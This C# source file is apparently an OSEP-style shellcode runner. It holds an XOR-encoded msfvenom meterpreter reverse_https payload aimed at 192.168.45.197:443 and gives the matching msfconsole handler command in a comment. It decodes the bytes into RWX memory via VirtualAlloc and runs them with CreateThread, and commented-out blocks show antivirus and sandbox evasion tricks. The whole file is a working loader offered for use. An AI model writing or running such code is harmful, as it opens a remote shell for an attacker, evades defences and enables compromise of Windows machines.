using System.Runtime.InteropServices;
using System;

namespace rev
{
    public class Program
    {
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        //[DllImport("kernel32.dll")]
        //static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
        //[DllImport("kernel32.dll")]
        //static extern IntPtr GetCurrentProcess();
        //[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        //static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        //[DllImport("kernel32.dll", SetLastError = true)]
        //public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObjectEx(IntPtr hHandle,UInt32 Wait, bool bAlertable);

        public static void Main()
        {
            //// AV evasion: Sleep for 10s and detect if time really passed
            //DateTime t1 = DateTime.Now;
            //Sleep(10000);
            //double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            //if (deltaT < 9.5)
            //{
            //    return;
            //}

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.197 LPORT=443 EXITFUNC=thread -f csharp
            // XORed with OSEP-Code-Snippets/general_encoders/xor_shellcode.py key 0xfa
            // sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.45.197; set lport 443; exploit"
            byte[] buf = new byte[665] {
            0x95,0x21,0xea,0x8d,0x99,0x81,0xa5,0x69,0x69,0x69,0x28,0x38,
            0x28,0x39,0x3b,0x38,0x21,0x58,0xbb,0x0c,0x21,0xe2,0x3b,0x09,
            0x21,0xe2,0x3b,0x71,0x21,0xe2,0x3b,0x49,0x3f,0x24,0x58,0xa0,
            0x21,0x66,0xde,0x23,0x23,0x21,0xe2,0x1b,0x39,0x21,0x58,0xa9,
            0xc5,0x55,0x08,0x15,0x6b,0x45,0x49,0x28,0xa8,0xa0,0x64,0x28,
            0x68,0xa8,0x8b,0x84,0x3b,0x28,0x38,0x21,0xe2,0x3b,0x49,0xe2,
            0x2b,0x55,0x21,0x68,0xb9,0x0f,0xe8,0x11,0x71,0x62,0x6b,0x66,
            0xec,0x1b,0x69,0x69,0x69,0xe2,0xe9,0xe1,0x69,0x69,0x69,0x21,
            0xec,0xa9,0x1d,0x0e,0x21,0x68,0xb9,0x39,0xe2,0x21,0x71,0x2d,
            0xe2,0x29,0x49,0x20,0x68,0xb9,0x8a,0x3f,0x21,0x96,0xa0,0x24,
            0x58,0xa0,0x28,0xe2,0x5d,0xe1,0x21,0x68,0xbf,0x21,0x58,0xa9,
            0xc5,0x28,0xa8,0xa0,0x64,0x28,0x68,0xa8,0x51,0x89,0x1c,0x98,
            0x25,0x6a,0x25,0x4d,0x61,0x2c,0x50,0xb8,0x1c,0xb1,0x31,0x2d,
            0xe2,0x29,0x4d,0x20,0x68,0xb9,0x0f,0x28,0xe2,0x65,0x21,0x2d,
            0xe2,0x29,0x75,0x20,0x68,0xb9,0x28,0xe2,0x6d,0xe1,0x28,0x31,
            0x21,0x68,0xb9,0x28,0x31,0x37,0x30,0x33,0x28,0x31,0x28,0x30,
            0x28,0x33,0x21,0xea,0x85,0x49,0x28,0x3b,0x96,0x89,0x31,0x28,
            0x30,0x33,0x21,0xe2,0x7b,0x80,0x22,0x96,0x96,0x96,0x34,0x21,
            0x58,0xb2,0x3a,0x20,0xd7,0x1e,0x00,0x07,0x00,0x07,0x0c,0x1d,
            0x69,0x28,0x3f,0x21,0xe0,0x88,0x20,0xae,0xab,0x25,0x1e,0x4f,
            0x6e,0x96,0xbc,0x3a,0x3a,0x21,0xe0,0x88,0x3a,0x33,0x24,0x58,
            0xa9,0x24,0x58,0xa0,0x3a,0x3a,0x20,0xd3,0x53,0x3f,0x10,0xce,
            0x69,0x69,0x69,0x69,0x96,0xbc,0x81,0x66,0x69,0x69,0x69,0x58,
            0x50,0x5b,0x47,0x58,0x5f,0x51,0x47,0x5d,0x5c,0x47,0x58,0x50,
            0x5e,0x69,0x33,0x21,0xe0,0xa8,0x20,0xae,0xa9,0xd2,0x68,0x69,
            0x69,0x24,0x58,0xa0,0x3a,0x3a,0x03,0x6a,0x3a,0x20,0xd3,0x3e,
            0xe0,0xf6,0xaf,0x69,0x69,0x69,0x69,0x96,0xbc,0x81,0x07,0x69,
            0x69,0x69,0x46,0x33,0x0a,0x50,0x20,0x03,0x1b,0x30,0x25,0x25,
            0x50,0x05,0x11,0x1a,0x31,0x2a,0x13,0x2f,0x3b,0x25,0x06,0x21,
            0x38,0x2a,0x3c,0x2f,0x3c,0x30,0x58,0x50,0x1b,0x3f,0x27,0x02,
            0x0c,0x1c,0x59,0x5b,0x5b,0x13,0x28,0x59,0x19,0x33,0x1c,0x07,
            0x0a,0x33,0x3d,0x2b,0x2e,0x1f,0x3e,0x0d,0x19,0x1b,0x3e,0x25,
            0x3a,0x59,0x0e,0x04,0x58,0x33,0x13,0x5b,0x5e,0x0d,0x00,0x00,
            0x2b,0x27,0x5f,0x0c,0x11,0x59,0x31,0x39,0x50,0x1f,0x07,0x2c,
            0x23,0x04,0x0e,0x25,0x39,0x18,0x5b,0x18,0x36,0x50,0x50,0x0a,
            0x1f,0x1b,0x08,0x2d,0x3f,0x0a,0x11,0x3e,0x30,0x44,0x00,0x0d,
            0x2c,0x5d,0x5e,0x69,0x21,0xe0,0xa8,0x3a,0x33,0x28,0x31,0x24,
            0x58,0xa0,0x3a,0x21,0xd1,0x69,0x5b,0xc1,0xed,0x69,0x69,0x69,
            0x69,0x39,0x3a,0x3a,0x20,0xae,0xab,0x82,0x3c,0x47,0x52,0x96,
            0xbc,0x21,0xe0,0xaf,0x03,0x63,0x36,0x21,0xe0,0x98,0x03,0x76,
            0x33,0x3b,0x01,0xe9,0x5a,0x69,0x69,0x20,0xe0,0x89,0x03,0x6d,
            0x28,0x30,0x20,0xd3,0x1c,0x2f,0xf7,0xef,0x69,0x69,0x69,0x69,
            0x96,0xbc,0x24,0x58,0xa9,0x3a,0x33,0x21,0xe0,0x98,0x24,0x58,
            0xa0,0x24,0x58,0xa0,0x3a,0x3a,0x20,0xae,0xab,0x44,0x6f,0x71,
            0x12,0x96,0xbc,0xec,0xa9,0x1c,0x76,0x21,0xae,0xa8,0xe1,0x7a,
            0x69,0x69,0x20,0xd3,0x2d,0x99,0x5c,0x89,0x69,0x69,0x69,0x69,
            0x96,0xbc,0x21,0x96,0xa6,0x1d,0x6b,0x82,0xc3,0x81,0x3c,0x69,
            0x69,0x69,0x3a,0x30,0x03,0x29,0x33,0x20,0xe0,0xb8,0xa8,0x8b,
            0x79,0x20,0xae,0xa9,0x69,0x79,0x69,0x69,0x20,0xd3,0x31,0xcd,
            0x3a,0x8c,0x69,0x69,0x69,0x69,0x96,0xbc,0x21,0xfa,0x3a,0x3a,
            0x21,0xe0,0x8e,0x21,0xe0,0x98,0x21,0xe0,0xb3,0x20,0xae,0xa9,
            0x69,0x49,0x69,0x69,0x20,0xe0,0x90,0x20,0xd3,0x7b,0xff,0xe0,
            0x8b,0x69,0x69,0x69,0x69,0x96,0xbc,0x21,0xea,0xad,0x49,0xec,
            0xa9,0x1d,0xdb,0x0f,0xe2,0x6e,0x21,0x68,0xaa,0xec,0xa9,0x1c,
            0xbb,0x31,0xaa,0x31,0x03,0x69,0x30,0xd2,0x89,0x74,0x43,0x63,
            0x28,0xe0,0xb3,0x96,0xbc};


            int payloadSize = buf.Length;
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);

            //IntPtr payAddr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE, 0);
            //if (payAddr == null)
            //{
            //    return;
            //}

            // Decode the XOR payload (make sure to change key)
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0x69);
            }
            //// Decode the ROT payload (make sure to change rotations)
            // for (int i = 0; i < payloadSize; i++)
            // {
            //    buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
            //}

            Marshal.Copy(buf, 0, payAddr, payloadSize);
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
            UInt32 blah = 0xFFFFFFFF;
            Int32 blah2 = WaitForSingleObjectEx(payThreadId, blah, false);
        }
    }
}